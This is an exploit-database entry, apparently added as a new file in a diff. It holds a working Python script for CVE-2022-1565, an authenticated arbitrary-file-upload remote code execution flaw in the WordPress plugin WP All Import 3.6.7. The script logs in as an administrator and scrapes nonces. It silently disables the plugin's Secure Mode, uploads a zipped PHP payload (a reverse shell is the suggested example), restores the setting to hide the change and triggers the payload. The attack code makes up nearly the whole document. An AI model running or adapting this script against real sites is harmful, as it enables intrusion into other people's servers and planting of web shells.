@@ -1,0 +1,292 @@
+id: 38367
+date: 03/29/2023
+title: WordPress WP All Import v3.6.7 - Remote Code Execution Exploit
+author: AkuCyberSec
+cves: CVE-2022-1565
+
+# Exploit Title: WP All Import v3.6.7 - Remote Code Execution (RCE) (Authenticated)
+# Exploit Author: AkuCyberSec (https://github.com/AkuCyberSec)
+# Vendor Homepage: https://www.wpallimport.com/
+# Software Link: https://wordpress.org/plugins/wp-all-import/advanced/ (scroll down to select the version)
+# Version: <= 3.6.7 (tested: 3.6.7)
+# Tested on: WordPress 6.1 (os-independent since this exploit does NOT provide the payload)
+# CVE: CVE-2022-1565
+
+#!/usr/bin/python
+import requests
+import re
+import os
+
+# WARNING: This exploit does NOT include the payload.
+# Also, be sure you already have some valid admin credentials. This exploit needs an administrator account in order to work.
+# If a file with the same name as the payload is already on the server, the upload will OVERWRITE it
+# 
+# Please notice that I'm NOT the researcher who found this vulnerability
+
+# # # # # VULNERABILITY DESCRIPTION # # # # #
+# The plugin WP All Import is vulnerable to arbitrary file uploads due to missing file type validation via the wp_all_import_get_gz.php file in versions up to, and including, 3.6.7. 
+# This makes it possible for authenticated attackers, with administrator level permissions and above, to upload arbitrary files on the affected sites server which may make remote code execution possible. 
+
+# # # # # HOW THE EXPLOIT WORKS # # # # #
+# 1. Prepare the zip file:
+#   - create a PHP file with your payload (e.g. rerverse shell)
+#   - set the variable "payload_file_name" with the name of this file (e.g. "shell.php")
+#   - create a zip file with the payload
+#   - set the variable "zip_file_to_upload" with the PATH of this file (e.g. "/root/shell.zip")
+#
+# 2. Login using an administrator account:
+#   - set the variable "target_url" with the base URL of the target (do NOT end the string with the slash /)
+#   - set the variable "admin_user" with the username of an administrator account
+#   - set the variable "admin_pass" with the password of an administrator account
+#
+# 3. Get the wpnonce using the get_wpnonce_upload_file() method
+#   - there are actually 2 types of wpnonce:
+#       - the first wpnonce will be retrieved using the method retrieve_wpnonce_edit_settings() inside the PluginSetting class.
+#           This wpnonce allows us to change the plugin settings (check the step 4)
+#       - the second wpnonce will be retrieved using the method retrieve_wpnonce_upload_file() inside the PluginSetting class.
+#           This wpnonce allows us to upload the file
+#   
+# 4. Check if the plugin secure mode is enabled using the method check_if_secure_mode_is_enabled() inside the PluginSetting class
+#   - if the Secure Mode is enabled, the zip content will be put in a folder with a random name.
+#       The exploit will disable the Secure Mode.
+#       By disabling the Secure Mode, the zip content will be put in the main folder (check the variable payload_url).
+#       The method called to enable and disable the Secure Mode is set_plugin_secure_mode(set_to_enabled:bool, wpnonce:str)
+#   - if the Secure Mode is NOT enabled, the exploit will upload the file but then it will NOT enable the Secure Mode.
+#
+# 5. Upload the file using the upload_file(wpnonce_upload_file: str) method
+#   - after the upload, the server should reply with HTTP 200 OK but it doesn't mean the upload was completed successfully.
+#       The response will contain a JSON that looks like this:
+#           {"jsonrpc":"2.0","error":{"code":102,"message":"Please verify that the file you uploading is a valid ZIP file."},"is_valid":false,"id":"id"}
+#       As you can see, it says that there's an error with code 102 but, according to the tests I've done, the upload is completed
+#
+# 6. Re-enable the Secure Mode if it was enabled using the switch_back_to_secure_mode() method
+#
+# 7. Activate the payload using the activate_payload() method
+#   - you can define a method to activate the payload.
+#       There reason behind this choice is that this exploit does NOT provide any payload.
+#       Since you can use a custom payload, you may want to activate it using an HTTP POST request instead of a HTTP GET request, or you may want to pass parameters
+
+# # # # # WHY DOES THE EXPLOIT DISABLE THE SECURE MODE? # # # # #
+# According to the PoC of this vulnerability provided by WPSCAN, we should be able to retrieve the uploaded files by visiting the "MAnaged Imports page"
+# I don't know why but, after the upload of any file, I couldn't see the uploaded file in that page (maybe the Pro version is required?)
+# I had to find a workaround and so I did, by exploiting this option.
+# WPSCAN Page: https://wpscan.com/vulnerability/578093db-a025-4148-8c4b-ec2df31743f7
+
+# # # # # ANY PROBLEM WITH THE EXPLOIT? # # # # #
+# In order for the exploit to work please consider the following:
+# 1. check the target_url and the admin credentials
+# 2. check the path of the zip file and the name of the payload (they can be different)
+# 3. if you're testing locally, try to set verify_ssl_certificate on False
+# 4. you can use print_response(http_response) to investigate further
+
+# Configure the following variables:
+target_url = "https://vulnerable.wp/wordpress"  # Target base URL
+admin_user = "admin"                            # Administrator username
+admin_pass = "password"                         # Administrator password
+zip_file_to_upload = "/shell.zip"               # Path to the ZIP file (e.g /root/shell.zip)
+payload_file_name = "shell.php"                 # Filename inside the zip file (e.g. shell.php). This file will be your payload (e.g. reverse shell)
+verify_ssl_certificate = True                   # If True, the script will exit if the SSL Certificate is NOT valid. You can set it on False while testing locally, if needed.
+
+# Do NOT change the following variables
+wp_login_url = target_url + "/wp-login.php"                                                 # WordPress login page
+wp_all_import_page_settings = target_url + "/wp-admin/admin.php?page=pmxi-admin-settings"   # Plugin page settings
+payload_url = target_url + "/wp-content/uploads/wpallimport/uploads/" + payload_file_name   # Payload will be uploaded here
+re_enable_secure_mode = False
+session = requests.Session()
+
+# This class helps to retrieve plugin settings, including the nonce(s) used to change settings and upload files.
+class PluginSetting:
+    # Regular Expression patterns
+    pattern_setting_secure_mode = r'<input[a-zA-Z0-9="_\- ]*id="secure"[a-zA-Z0-9="_\-/ ]*>'
+    pattern_wpnonce_edit_settings = r'<input[a-zA-Z0-9="_\- ]*id="_wpnonce_edit\-settings"[a-zA-Z0-9="_\- ]*value="([a-zA-Z0-9]+)"[a-zA-Z0-9="_\-/ ]*>'
+    pattern_wpnonce_upload_file = r'wp_all_import_security[ ]+=[ ]+["\']{1}([a-zA-Z0-9]+)["\']{1};'
+    http_response: requests.Response
+    is_secure_mode_enabled: bool
+    wpnonce_edit_settings: str
+    wpnonce_upload_file: str
+
+    def __init__(self,  http_response: requests.Response):
+        self.http_response = http_response
+        self.check_if_secure_mode_is_enabled()
+        self.retrieve_wpnonce_edit_settings()
+        self.retrieve_wpnonce_upload_file()
+
+    def check_if_secure_mode_is_enabled(self):
+        # To tell if the Secure Mode is enabled you can check if the checkbox with id "secure" is checked
+        # <input type="checkbox" value="1" id="secure" name="secure" checked="checked">
+        regex_search = re.search(self.pattern_setting_secure_mode, self.http_response.text)
+        if not regex_search:
+            print("Something went wrong: could not retrieve plugin settings. Are you an administrator?")
+            # print_response(self.http_response) # for debugging
+            exit()
+        self.is_secure_mode_enabled = "checked" in regex_search.group()
+        
+    def retrieve_wpnonce_edit_settings(self):
+        # You can find this wpnonce in the source file by searching for the following input hidden:
+        # <input type="hidden" id="_wpnonce_edit-settings" name="_wpnonce_edit-settings" value="052e2438f9">
+        # 052e2438f9 would be the wpnonce for editing the settings
+        regex_search = re.search(self.pattern_wpnonce_edit_settings, self.http_response.text)
+        if not regex_search:
+            print("Something went wrong: could not retrieve _wpnonce_edit-settings parameter. Are you an administrator?")
+            # print_response(self.http_response) # for debugging
+            exit()
+        
+        self.wpnonce_edit_settings = regex_search.group(1)
+
+    def retrieve_wpnonce_upload_file(self):
+        # You can find this wpnonce in the source file by searching for the following javascript variable: var wp_all_import_security = 'dee75fdb8b';
+        # dee75fdb8b would be the wpnonce for the upload
+        regex_search = re.search(self.pattern_wpnonce_upload_file, self.http_response.text)
+        if not regex_search:
+            print("Something went wrong: could not retrieve the upload wpnonce from wp_all_import_security variable")
+            # print_response(self.http_response) # for debugging
+            exit()
+        
+        self.wpnonce_upload_file = regex_search.group(1)
+        
+def wp_login():
+    global session
+    data = { "log" : admin_user, "pwd" : admin_pass, "wp-submit" : "Log in", "redirect_to" : wp_all_import_page_settings, "testcookie" : 1 }
+    login_cookie = { "wordpress_test_cookie" : "WP Cookie check" }
+
+    # allow_redirects is set to False because, when credentials are correct, wordpress replies with 302 found.
+    # Looking for this HTTP Response Code makes it easier to tell whether the credentials were correct or not
+    print("Trying to login...")
+    response = session.post(url=wp_login_url, data=data, cookies=login_cookie, allow_redirects=False, verify=verify_ssl_certificate)
+
+    if response.status_code == 302:
+        print("Logged in successfully!")
+        return
+
+    # print_response(response) # for debugging
+    print("Login failed. If the credentials are correct, try to print the response to investigate further.")
+    exit()
+
+def set_plugin_secure_mode(set_to_enabled:bool, wpnonce:str) -> requests.Response:
+    global session
+    if set_to_enabled:
+        print("Enabling secure mode...")
+    else:
+        print("Disabling secure mode...")
+
+    print("Edit settings wpnonce value: " + wpnonce)
+    data = { "secure" : (1 if set_to_enabled else 0), "_wpnonce_edit-settings" : wpnonce, "_wp_http_referer" : wp_all_import_page_settings, "is_settings_submitted" : 1 }
+    response = session.post(url=wp_all_import_page_settings, data=data, verify=verify_ssl_certificate)
+
+    if response.status_code == 403:
+        print("Something went wrong: HTTP Status code is 403 (Forbidden). Wrong wpnonce?")
+        # print_response(response) # for debugging
+        exit()
+    return response
+
+def switch_back_to_secure_mode():
+    global session
+
+    print("Re-enabling secure mode...")
+    response = session.get(url=wp_all_import_page_settings)
+    plugin_setting = PluginSetting(response)
+
+    if plugin_setting.is_secure_mode_enabled:
+        print("Secure mode is already enabled")
+        return
+    
+    response = set_plugin_secure_mode(set_to_enabled=True,wpnonce=plugin_setting.wpnonce_edit_settings)
+    new_plugin_setting = PluginSetting(response)
+    if not new_plugin_setting.is_secure_mode_enabled:
+        print("Something went wrong: secure mode has not been re-enabled")
+        # print_response(response) # for debugging
+        exit()
+    print("Secure mode has been re-enabled!")
+
+def get_wpnonce_upload_file() -> str:
+    global session, re_enable_secure_mode    
+    # If Secure Mode is enabled, the exploit tries to disable it, then returns the wpnonce for the upload
+    # If Secure Mode is already disabled, it just returns the wpnonce for the upload
+
+    print("Checking if secure mode is enabled...")
+    response = session.get(url=wp_all_import_page_settings)
+    plugin_setting = PluginSetting(response)
+
+    if not plugin_setting.is_secure_mode_enabled:
+        re_enable_secure_mode = False
+        print("Insecure mode is already enabled!")
+        return plugin_setting.wpnonce_upload_file
+
+    print("Secure mode is enabled. The script will disable secure mode for the upload, then it will be re-enabled.")
+    response = set_plugin_secure_mode(set_to_enabled=False, wpnonce=plugin_setting.wpnonce_edit_settings)
+
+    new_plugin_setting = PluginSetting(response)
+
+    if new_plugin_setting.is_secure_mode_enabled:
+        print("Something went wrong: secure mode has not been disabled")
+        # print_response(response) # for debugging
+        exit()
+    
+    print("Secure mode has been disabled!")
+    re_enable_secure_mode = True
+    return new_plugin_setting.wpnonce_upload_file
+
+def upload_file(wpnonce_upload_file: str):
+    global session
+
+    print("Uploading file...")
+    print("Upload wpnonce value: " + wpnonce_upload_file)
+
+    zip_file_name = os.path.basename(zip_file_to_upload)
+    upload_url = wp_all_import_page_settings + "&action=upload&_wpnonce=" + wpnonce_upload_file
+    files = { "async-upload" : (zip_file_name, open(zip_file_to_upload, 'rb'))}
+    data = { "name" : zip_file_name }
+    response = session.post(url=upload_url, files=files, data=data)
+
+    if response.status_code == 200:
+        print("Server replied with HTTP 200 OK. The upload should be completed.")
+        print("Payload should be here: " + payload_url)
+        print("If you can't find the payload at this URL, try to print the response to investigate further")
+        # print_response(response) # for debugging
+        return 1
+    else:
+        print("Something went wrong during the upload. Try to print the response to investigate further")
+        # print_response(response) # for debugging
+        return 0
+        
+def activate_payload():
+    global session
+
+    print("Activating payload...")
+    response = session.get(url=payload_url)
+
+    if response.status_code != 200:
+        print("Something went wrong: could not find payload at " + payload_url)
+        # print_response(response) # for debugging
+        return
+
+def print_response(response:requests.Response):
+    print(response.status_code)
+    print(response.text)
+    
+# Entry Point
+def Main():
+    print("Target: " + target_url)
+    print("Credentials: " + admin_user + ":" + admin_pass)
+
+    # Do the login
+    wp_login()
+
+    # Retrieve wpnonce for upload.
+    # It disables Secure Mode if needed, then returns the wpnonce
+    wpnonce_upload_file = get_wpnonce_upload_file()
+
+    # Upload the file
+    file_uploaded = upload_file(wpnonce_upload_file)
+
+    # Re-enable Secure Mode if needed
+    if re_enable_secure_mode:
+        switch_back_to_secure_mode()
+
+    # Activate the payload
+    if file_uploaded:
+        activate_payload()
+
+Main()
+
+#  0day.today [2023-04-03]  #
